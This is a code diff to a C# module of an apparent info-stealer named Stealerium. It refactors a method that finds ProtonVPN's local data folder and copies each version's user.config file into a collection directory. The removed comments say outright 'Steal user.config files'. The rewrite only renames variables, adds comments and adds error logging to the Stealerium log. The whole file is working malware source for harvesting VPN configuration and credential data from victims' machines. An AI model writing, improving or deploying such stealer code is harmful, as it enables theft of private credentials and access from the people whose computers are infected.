@@ -6,34 +6,49 @@ namespace Stealerium.Target.VPN
 {
     internal sealed class ProtonVpn
     {
-        // Save("ProtonVPN");
-        public static void Save(string sSavePath)
+        // Save ProtonVPN configuration files to the specified path
+        public static void Save(string savePath)
         {
-            // "ProtonVPN" directory path
-            var vpn = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                "ProtonVPN");
-            // Stop if not exists
-            if (!Directory.Exists(vpn))
+            // Define the ProtonVPN directory path
+            var protonVpnPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
+
+            // Stop if the ProtonVPN directory does not exist
+            if (!Directory.Exists(protonVpnPath))
                 return;
+
             try
             {
-                // Steal user.config files
-                foreach (var dir in Directory.GetDirectories(vpn))
-                    if (dir.Contains("ProtonVPN.exe"))
-                        foreach (var version in Directory.GetDirectories(dir))
+                // Iterate over all subdirectories in the ProtonVPN folder
+                foreach (var directory in Directory.GetDirectories(protonVpnPath))
+                {
+                    // Look for ProtonVPN executable directories
+                    if (directory.Contains("ProtonVPN.exe"))
+                    {
+                        // Iterate over each version directory inside the ProtonVPN executable directory
+                        foreach (var versionDirectory in Directory.GetDirectories(directory))
                         {
-                            var configLocation = version + "\\user.config";
-                            var copyDirectory = Path.Combine(
-                                sSavePath, new DirectoryInfo(Path.GetDirectoryName(configLocation)).Name);
-                            if (Directory.Exists(copyDirectory)) continue;
-                            Counter.Vpn++;
-                            Directory.CreateDirectory(copyDirectory);
-                            File.Copy(configLocation, copyDirectory + "\\user.config");
+                            var userConfigPath = Path.Combine(versionDirectory, "user.config");
+                            if (!File.Exists(userConfigPath)) continue;
+
+                            // Define the destination directory to copy the configuration
+                            var destinationDir = Path.Combine(savePath, new DirectoryInfo(versionDirectory).Name);
+
+                            if (!Directory.Exists(destinationDir))
+                            {
+                                Counter.Vpn++;
+                                Directory.CreateDirectory(destinationDir);
+
+                                // Copy the user.config file to the destination directory
+                                File.Copy(userConfigPath, Path.Combine(destinationDir, "user.config"));
+                            }
                         }
+                    }
+                }
             }
-            catch
+            catch (Exception error)
             {
-                // ignored
+                // Log or handle the exception if necessary
+                Logging.Log("ProtonVPN >> Error saving ProtonVPN data:\n" + error);
             }
         }
     }
